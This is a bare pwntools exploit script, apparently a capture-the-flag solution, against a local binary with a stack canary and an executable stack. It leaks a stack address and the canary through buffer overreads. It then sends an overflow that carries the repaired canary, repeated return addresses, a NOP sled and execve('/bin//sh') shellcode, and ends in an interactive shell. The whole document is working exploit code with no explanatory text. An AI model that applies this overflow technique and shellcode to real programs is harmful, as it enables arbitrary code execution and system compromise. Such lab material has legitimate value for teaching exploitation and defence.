from pwn import *

p = process("pwn2/bof_canary_execstack")
addr = 0x7fffffffe6a8

shcode = "48 31 f6 48 31 d2 52 48 b8 2f 62 69 6e 2f 2f 73  68 50 48 31 c0 48 89 e7 b0 3b 0f 05"
shcode = shcode.replace(' ', '')

mes = "48\n"
mes += '1' * 48

p.sendline(mes)

resp = p.recv(56)
addr = resp[48:54] + '\x00\x00'

addr = u64(addr)

print(hex(addr))

mes = "57\n"
mes += '1' * 57

p.send(mes)

resp = p.recv(64)

canary = resp[56:]
canary = '\x00' + canary[1:]

print(canary)

mes = '1' * 56
mes += canary
mes += p64(addr + 128) * 10
mes += "\x90" * 512
mes += unhex(shcode)
mes = str(len(mes)) + '\n' + mes + '0\n'

p.send(mes)

p.interactive()
